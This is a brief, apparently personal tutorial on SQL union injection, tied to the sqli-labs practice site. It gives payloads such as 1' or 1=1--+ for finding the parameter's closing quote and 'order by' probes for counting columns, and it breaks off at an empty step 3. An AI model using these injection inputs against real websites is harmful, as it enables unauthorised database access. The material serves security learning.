# SQL Injection

> Before wirting, I want to share a useful learning website about sqli. That [sqli-labs](https://www.cnblogs.com/zhengna/p/12617743.html)

And you are supposed to know the basic of sqli, such as some userful function like "user()","database()","group_concat()", and note that the use
of "#", "--+", etc.

## 1. Union Injection

Here are some basic steps of union injection.

### 1. Look for the type of closing symbol

See you need to upload the **$id**

You can put "/?id=" + followings:
1. 1 or 1=1--+
2. 1' or 1=1--+
3. 1" or 1=1--+
4. 1) or 1=1--+
5. 1') or 1=1--+
6. 1") or 1=1--+

You can find that the correct closing lead to a normal reflect instead of ERROR.

### 2. Ensure the column number

We assume that $id closed by single quote, then use **order** to find the columns.

Try 
"""
1' order by 1--+
""" 
and then 
"""
1' order by 2--+
"""
 until errors. That's the column number.

### 3. 
